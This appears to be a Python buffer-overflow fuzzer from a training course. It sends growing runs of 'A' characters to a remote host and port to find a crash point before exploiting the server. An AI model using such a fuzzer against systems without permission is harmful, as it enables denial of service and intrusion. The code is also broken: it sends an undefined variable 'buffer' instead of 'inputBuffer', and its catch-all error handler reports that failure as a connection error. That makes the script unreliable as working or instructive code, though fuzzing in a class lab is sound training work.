#!/usr/bin/python

### Developed to use as a fuzzer to fuzz remote port for BO purposes. This is useful during the in-class Practical where he
### goes through exploiting the remote server



import socket
import time
import sys

size = 100

if len(sys.argv) != 3:
   print("fuzzer.py <rhost IP> <rport>")
   sys.exit()
else:
   if len(sys.argv[1].split(".")) != 4:
      print("IP address is not valid")
      sys.exit()
   else:
      rhost = sys.argv[1]
      rport = int(sys.argv[2])
      print(rhost)
      print(rport)

print("\nSending Evil Buffer...")

while(size < 2000):
   try:
      print("Sending " + str(size) + " As... ...")

      inputBuffer = "A" * size
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((rhost, rport))
      s.send(buffer)

      s.close()

      size += 100
      time.sleep(10)

   except:
      print("Could not connect!")
      sys.exit()

print("\nDone!")
